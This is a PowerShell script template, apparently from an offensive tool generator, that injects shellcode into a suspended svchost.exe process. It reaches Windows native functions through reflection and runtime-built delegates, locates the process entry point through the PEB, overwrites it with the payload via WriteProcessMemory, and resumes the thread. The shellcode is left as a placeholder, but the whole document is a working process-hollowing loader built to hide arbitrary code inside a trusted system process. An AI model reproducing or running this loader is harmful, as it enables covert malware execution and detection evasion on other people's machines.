[Byte[]] $SHELLCODE = FORMATTEDSHELLCODE ;

filter GETTYPE ([string]$DLLNAME,[string]$TYPENAME){
if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($DLLNAME) ){
$_.GetType($TYPENAME)
}
}

function GETFUNCTION{Param([string] $MODULE,[string] $FUNCTION)

$MODULEHANDLE = $GETMODULEHANDLE.(\Invoke\)($null, @($MODULE))
$GETPROCADDRESS.(\Invoke\)($null, @($MODULEHANDLE, $FUNCTION))
}

function GETDELEGATE{Param ([Parameter(Position = 0, Mandatory = $True)] [IntPtr] $FUNCADDR,[Parameter(Position = 1, Mandatory = $True)] [Type[]] $ARGTYPES,[Parameter(Position = 2)] [Type] $RETTYPE = [Void])

$TYPE = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('QM', $false).DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$TYPE.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $ARGTYPES).SetImplementationFlags((\Runtime, Managed\))
$TYPE.DefineMethod((\Invoke\), (\Public, HideBySig, NewSlot, Virtual\), $RETTYPE, $ARGTYPES).SetImplementationFlags((\Runtime, Managed\))
$DELEGATE = $TYPE.CreateType()

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FUNCADDR, $DELEGATE)
}

$ASSEMBLIES = [AppDomain]::CurrentDomain.GetAssemblies()
$UNSAFEMETHODSTYPE = $ASSEMBLIES | GETTYPE (\System.dll\) (\Microsoft.Win32.UnsafeNativeMethods\)
$NATIVEMETHODSTYPE = $ASSEMBLIES | GETTYPE (\System.dll\) (\Microsoft.Win32.NativeMethods\)
$STARTUPINFORMATIONTYPE = $ASSEMBLIES | GETTYPE (\System.dll\) (\Microsoft.Win32.NativeMethods+STARTUPINFO\)
$PROCESSINFORMATIONTYPE = $ASSEMBLIES | GETTYPE (\System.dll\) (\Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION\)

$GETMODULEHANDLE = $UNSAFEMETHODSTYPE.GetMethod((\GetModuleHandle\))
$GETPROCADDRESS = $UNSAFEMETHODSTYPE.GetMethod((\GetProcAddress\), [reflection.bindingflags](\Public,Static\), $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CREATEPROCESS = $NATIVEMETHODSTYPE.GetMethod((\CreateProcess\))

$RESUMETHREADADDR = GETFUNCTION (\kernel32.dll\) (\ResumeThread\)
$READPROCESSMEMORYADDR = GETFUNCTION (\kernel32.dll\) (\ReadProcessMemory\)
$WRITEPROCESSMEMORYADDR = GETFUNCTION (\kernel32.dll\) (\WriteProcessMemory\)
$ZWQUERYINFORMATIONPROCESSADDR = GETFUNCTION (\ntdll.dll\) (\ZwQueryInformationProcess\)

$RESUMETHREAD = GETDELEGATE $RESUMETHREADADDR @([IntPtr])
$READPROCESSMEMORY = GETDELEGATE $READPROCESSMEMORYADDR @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
$WRITEPROCESSMEMORY = GETDELEGATE $WRITEPROCESSMEMORYADDR @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
$ZWQUERYINFORMATIONPROCESS = GETDELEGATE $ZWQUERYINFORMATIONPROCESSADDR @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])

$STARTUPINFORMATION = $STARTUPINFORMATIONTYPE.(\GetConstructors\)().(\Invoke\)($null)
$PROCESSINFORMATION = $PROCESSINFORMATIONTYPE.(\GetConstructors\)().(\Invoke\)($null)

$CMD = [System.Text.StringBuilder]::new("C:/Windows/System32/svchost.exe")
$CREATEPROCESS.(\Invoke\)($null, @($null, $CMD, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $STARTUPINFORMATION, $PROCESSINFORMATION))

$HTHREAD = $PROCESSINFORMATION.hThread
$HPROCESS = $PROCESSINFORMATION.hProcess

$PROCESSBASICINFORMATION = [System.Byte[]]::CreateInstance([System.Byte], 48)
$ZWQUERYINFORMATIONPROCESS.(\Invoke\)($HPROCESS, 0, $PROCESSBASICINFORMATION, $PROCESSBASICINFORMATION.Length, 0)

$IMAGEBASEADDRPEB = ([IntPtr]::new([BitConverter]::ToUInt64($PROCESSBASICINFORMATION, 0x08) + 0x10))

$MEMORYBUFFER = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
$READPROCESSMEMORY.(\Invoke\)($HPROCESS, $IMAGEBASEADDRPEB, $MEMORYBUFFER, 0x08, 0)

$IMAGEBASEADDR = [BitConverter]::ToInt64($MEMORYBUFFER, 0)
$IMAGEBASEADDRPOINTER = [IntPtr]::new($IMAGEBASEADDR)

$READPROCESSMEMORY.(\Invoke\)($HPROCESS, $IMAGEBASEADDRPOINTER, $MEMORYBUFFER, $MEMORYBUFFER.Length, 0)

$PEOFFSET = [BitConverter]::ToUInt32($MEMORYBUFFER, 0x3c)
$ENTRYPOINTADDRRELATIVE = [BitConverter]::ToUInt32($MEMORYBUFFER, $PEOFFSET + 0x28)
$ENTRYPOINTADDR = [IntPtr]::new($IMAGEBASEADDR + $ENTRYPOINTADDRRELATIVE)

$WRITEPROCESSMEMORY.(\Invoke\)($HPROCESS, $ENTRYPOINTADDR, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
$RESUMETHREAD.(\Invoke\)($HTHREAD)

exit